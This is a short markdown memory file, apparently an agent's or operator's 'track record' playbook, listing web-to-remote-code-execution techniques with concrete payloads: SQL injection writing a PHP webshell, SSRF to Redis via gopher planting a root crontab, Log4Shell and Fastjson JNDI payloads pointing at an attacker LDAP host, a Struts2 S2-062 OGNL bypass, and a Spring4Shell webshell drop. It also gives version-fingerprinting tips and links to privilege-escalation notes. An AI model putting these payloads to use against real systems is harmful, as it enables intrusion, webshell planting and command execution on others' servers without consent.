---
name: web-rce-track-record
description: Web → RCE 工作轨迹 —— SQLi OUTFILE、SSRF Redis gopher、Log4Shell、Fastjson、Struts2 S2-062、Spring4Shell | Web to RCE track record
metadata:
  type: project
---

## 已交付类别

- **SQLi INTO OUTFILE**：MySQL 5.7 with FILE priv + `secure_file_priv` empty；`ORDER BY` column count → `UNION SELECT ... INTO OUTFILE '/var/www/html/uploads/s.php'-- -`；PHP webshell 20-30 char；column type 匹配 TEXT 列

- **SSRF → Redis via gopher**：`gopher://127.0.0.1:6379/_` + CRLF-encoded (`%0D%0A`)；`CONFIG SET dir /var/spool/cron/ + CONFIG SET dbfilename root + SET x "cron entry" + SAVE`；`\n\n` 前后包 crontab line 防 syntax error

- **Log4Shell (CVE-2021-44228)**：marshalsec LDAP → Exploit.class HTTP host → `User-Agent: ${jndi:ldap://<a>:1389/Exploit}`；JDK 8u181 直接 class URL；11+ 需要 object factory 弹路径；`Runtime.exec("cmd.exe /c calc.exe")` lab-safe payload

- **Fastjson 1.2.24 unmarshal**：`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<a>:1389/Exploit","autoCommit":true}`；version probe `{"@type":"java.lang.AutoCloseable"}` 看 error 特征；1.2.25+ 需要不同 gadget chain

- **Struts2 S2-062 (CVE-2021-31805)**：OGNL `%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):...)}` 清 exclusions → `ProcessBuilder.start()`；`%` 需要 double-encode `%25` 因为 reverse proxy 先解一次

- **Spring4Shell (CVE-2022-22965)**：`class.module.classLoader.resources.context.parent.pipeline.first.*` 属性链 → Tomcat AccessLogValve → drop `.jsp` webshell → `?pwd=j&cmd=id`；需要 JDK 9+ + Spring 5.3.x < 5.3.18；`directory=webapps/ROOT` 必须写全

## Web 探测惯例

- 先摸版本：Server header / X-Powered-By / err page fingerprint
- OGNL / Fastjson / Log4Shell 都有低成本 version probe（触发 err 或 `${jndi:ldap://...}` DNS）
- URL-encoding depth 匹配前置 proxy 层数

## 工作模式


## 相关 memory

- [[vuln-research-track-record]] 二进制侧 exploit
- [[lpe-track-record]] 拿到 shell 后的提权
